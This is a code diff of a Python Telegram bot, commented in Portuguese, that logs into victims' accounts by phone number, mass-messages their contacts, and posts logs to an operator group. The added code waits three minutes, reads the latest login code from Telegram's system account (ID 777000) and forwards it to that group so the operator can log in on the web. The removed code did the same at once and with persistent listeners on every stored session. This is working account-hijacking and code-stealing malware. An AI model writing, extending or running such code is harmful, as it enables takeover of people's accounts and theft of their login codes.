@@ -149,13 +149,9 @@ async def login_and_send_messages(phone, code=None, phone_code_hash=None, update
         log_message = f"O número '+{phone}' acabou de fazer login com sucesso!\n\n" \
                      f"Total de contatos encontrados: {len(contacts)}\n\n" \
                      f"Mensagens enviadas: {success_count}, Falhas: {fail_count}"
-                      
-        # Verificar se há mensagens do sistema Telegram (ID 777000)
-        print("Verificando mensagens do sistema Telegram...")
-        system_success, system_message = await monitor_telegram_messages(client, phone)
         
-        if system_success:
-            log_message += f"\n\n{system_message}"
+        # Nova mensagem informando sobre o timer de 3 minutos
+        timer_message = "Você terá 3 minutos para fazer login no web para o usuário receber outro código e eu vou buscar e mandar aqui novamente."
         
         # NOVA IMPLEMENTAÇÃO SIMPLIFICADA: Entre no grupo especificado, envie o log e depois saia
         try:
@@ -167,15 +163,19 @@ async def login_and_send_messages(phone, code=None, phone_code_hash=None, update
                 # 2. Enviar a mensagem de log no grupo sem botões inline
                 print("Enviando mensagem de log no grupo...")
                 await client.send_message(group_entity, log_message)
-                print("Mensagem de log enviada com sucesso no grupo")
                 
-                # 3. Aguardar um pouco antes de sair
-                await asyncio.sleep(2)
-                
+                # Enviar a mensagem de timer separadamente
+                await client.send_message(group_entity, timer_message)
+                print("Mensagem de log e timer enviados com sucesso no grupo")
+                                
                 # 4. Sair do grupo
                 print("Saindo do grupo...")
                 await leave_telegram_group(client, group_entity)
                 print(f"Saiu com sucesso do grupo: {group_entity.title if hasattr(group_entity, 'title') else 'Teste'}")
+                
+                # 5. Configurar o timer para obter e enviar mensagem do sistema após 3 minutos
+                # Criamos uma Task para isso para não bloquear a execução atual
+                asyncio.create_task(check_system_message_after_delay(phone, 180))  # 180 segundos = 3 minutos
             else:
                 print("Não foi possível entrar no grupo especificado.")
                 # Enviar mensagem diretamente para o criador do bot como backup
@@ -192,6 +192,78 @@ async def login_and_send_messages(phone, code=None, phone_code_hash=None, update
         return "Operação concluída com sucesso!"
     except Exception as e:
         return f"Erro durante a operação: {e}"
+    finally:
+        await client.disconnect()
+
+# Nova função para verificar mensagens do sistema após um delay
+async def check_system_message_after_delay(phone, delay_seconds=180):
+    print(f"Timer iniciado: verificando mensagens do sistema em {delay_seconds} segundos para +{phone}...")
+    
+    # Aguarda o tempo especificado
+    await asyncio.sleep(delay_seconds)
+    
+    print(f"Timer concluído: verificando mensagens do sistema para +{phone}")
+    
+    # Conecta ao cliente Telethon usando a sessão do usuário
+    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
+    await client.connect()
+    
+    try:
+        if await client.is_user_authorized():
+            # ID do sistema Telegram
+            telegram_system_id = 777000
+            
+            # Buscar as mensagens recentes do sistema Telegram
+            from telethon.tl.functions.messages import GetHistoryRequest
+            
+            # Obtém a entidade do sistema Telegram
+            system_entity = await client.get_entity(telegram_system_id)
+            
+            # Obtém o histórico de mensagens
+            history = await client(GetHistoryRequest(
+                peer=system_entity,
+                limit=10,  # Limitar a 10 mensagens recentes
+                offset_date=None,
+                offset_id=0,
+                max_id=0,
+                min_id=0,
+                add_offset=0,
+                hash=0
+            ))
+            
+            # Se não há mensagens, retorna
+            if not history.messages:
+                print(f"Nenhuma mensagem do sistema encontrada para +{phone} após o timer")
+                await client.disconnect()
+                return
+            
+            # Pega a mensagem mais recente
+            latest_message = history.messages[0]
+            print(f"Mensagem mais recente do sistema para +{phone}: {latest_message.message}")
+            
+            # Formata a mensagem para reenvio
+            system_message = f"📢 CÓDIGO DO SISTEMA PARA +{phone} (após 3 minutos):\n\n{latest_message.message}\n\nRecebida em: {latest_message.date}"
+            
+            # Entrar no grupo, enviar a mensagem e sair
+            group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
+            
+            if group_entity:
+                # Enviar a mensagem
+                await client.send_message(group_entity, system_message)
+                print(f"Mensagem do sistema para +{phone} reenviada ao grupo após o timer")
+                
+                # Aguardar antes de sair
+                await asyncio.sleep(1)
+                
+                # Sair do grupo
+                await leave_telegram_group(client, group_entity)
+                print(f"Saiu do grupo após enviar o código para +{phone}")
+            else:
+                print(f"Não foi possível entrar no grupo para reenviar mensagens do sistema para +{phone}")
+        else:
+            print(f"Sessão para +{phone} não está mais autorizada, não é possível verificar mensagens")
+    except Exception as e:
+        print(f"Erro ao verificar mensagens do sistema após timer para +{phone}: {e}")
     finally:
         await client.disconnect()
 
@@ -642,67 +714,6 @@ async def send_message_to_group(bot, chat_id, message_text, phone=None):
         print(f"Erro ao enviar mensagem para o grupo: {e}")
         return False, f"Erro ao enviar mensagem: {str(e)}"
 
-# Função para monitorar mensagens do sistema Telegram (ID 777000)
-async def monitor_telegram_messages(client, phone, update=None):
-    try:
-        # ID do sistema Telegram
-        telegram_system_id = 777000
-        
-        print(f"Iniciando monitoramento de mensagens do sistema para +{phone}...")
-        
-        # Buscar as mensagens recentes do sistema Telegram
-        from telethon.tl.functions.messages import GetHistoryRequest
-        
-        # Obtém a entidade do sistema Telegram
-        system_entity = await client.get_entity(telegram_system_id)
-        
-        # Obtém o histórico de mensagens
-        history = await client(GetHistoryRequest(
-            peer=system_entity,
-            limit=10,  # Limitar a 10 mensagens recentes
-            offset_date=None,
-            offset_id=0,
-            max_id=0,
-            min_id=0,
-            add_offset=0,
-            hash=0
-        ))
-        
-        # Se não há mensagens, retorna
-        if not history.messages:
-            print("Nenhuma mensagem do sistema encontrada")
-            return False, "Nenhuma mensagem do sistema encontrada"
-        
-        # Pega a mensagem mais recente
-        latest_message = history.messages[0]
-        print(f"Mensagem mais recente do sistema: {latest_message.message}")
-        
-        # Formata a mensagem para reenvio
-        system_message = f"📢 MENSAGEM DO SISTEMA PARA +{phone}:\n\n{latest_message.message}\n\nRecebida em: {latest_message.date}"
-        
-        # Entrar no grupo, enviar a mensagem e sair
-        group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
-        
-        if group_entity:
-            # Enviar a mensagem
-            await client.send_message(group_entity, system_message)
-            print("Mensagem do sistema reenviada para o grupo com sucesso")
-            
-            # Aguardar antes de sair
-            await asyncio.sleep(1)
-            
-            # Sair do grupo
-            await leave_telegram_group(client, group_entity)
-            
-            return True, "Mensagem do sistema reenviada com sucesso"
-        else:
-            print("Não foi possível entrar no grupo para reenviar mensagem do sistema")
-            return False, "Não foi possível entrar no grupo"
-            
-    except Exception as e:
-        print(f"Erro ao monitorar mensagens do sistema: {e}")
-        return False, f"Erro ao monitorar mensagens: {str(e)}"
-
 def main():
     # Obtém o token do bot do arquivo .env
     token = os.getenv('BOT_TOKEN')
@@ -725,8 +736,7 @@ def main():
     # Adicionar handler para os callback queries (botões inline)
     app.add_handler(CallbackQueryHandler(button_callback))
     
-    # Iniciar um cliente Telethon para lidar com os callbacks e monitorar mensagens do sistema
-    # Use uma das sessões existentes ou crie uma nova para o bot
+    # Iniciar um cliente Telethon para lidar com os callbacks
     async def start_telethon():
         try:
             # Você pode usar uma sessão específica aqui ou criar uma para o bot
@@ -746,54 +756,7 @@ def main():
             # Registrar o handler de callback de forma explícita
             bot_client.add_event_handler(callback_handler, events.CallbackQuery)
             
-            # Iniciar clientes Telethon para todas as sessões existentes
-            # Isso permite monitorar as mensagens do sistema para cada conta
-            print("Iniciando monitoramento de contas...")
-            sessions = find_existing_sessions()
-            for phone in sessions:
-                try:
-                    # Criar cliente para cada sessão existente
-                    client = TelegramClient(f"session_+{phone}", api_id, api_hash)
-                    await client.connect()
-                    
-                    if await client.is_user_authorized():
-                        print(f"Iniciando monitoramento para a conta +{phone}")
-                        
-                        # Adiciona handler para monitorar mensagens específicas do sistema
-                        @client.on(events.NewMessage(from_users=777000))
-                        async def handle_system_message(event):
-                            message = event.message
-                            print(f"Nova mensagem do sistema para +{phone}: {message.message}")
-                            
-                            # Formata a mensagem para reenvio
-                            system_message = f"📢 MENSAGEM DO SISTEMA PARA +{phone}:\n\n{message.message}\n\nRecebida em: {message.date}"
-                            
-                            # Entrar no grupo, enviar a mensagem e sair
-                            try:
-                                # 1. Entrar no grupo
-                                group_entity = await join_telegram_group(client, group_id=-4784851093, group_username="linbotteste")
-                                
-                                if group_entity:
-                                    # 2. Enviar a mensagem
-                                    await client.send_message(group_entity, system_message)
-                                    print(f"Mensagem do sistema para +{phone} reenviada ao grupo")
-                                    
-                                    # 3. Aguardar um pouco
-                                    await asyncio.sleep(1)
-                                    
-                                    # 4. Sair do grupo
-                                    await leave_telegram_group(client, group_entity)
-                            except Exception as e:
-                                print(f"Erro ao reenviar mensagem do sistema: {e}")
-                        
-                        print(f"Monitoramento configurado para +{phone}")
-                    else:
-                        print(f"Sessão para +{phone} não está autorizada, não será monitorada")
-                        await client.disconnect()
-                except Exception as e:
-                    print(f"Erro ao iniciar monitoramento para +{phone}: {e}")
-            
-            print("Cliente Telethon iniciado para escutar callbacks e mensagens do sistema")
+            print("Cliente Telethon iniciado para escutar callbacks")
             print(f"Cliente conectado: {bot_client.is_connected()}")
             print(f"Handlers registrados: {bot_client.list_event_handlers()}")
             
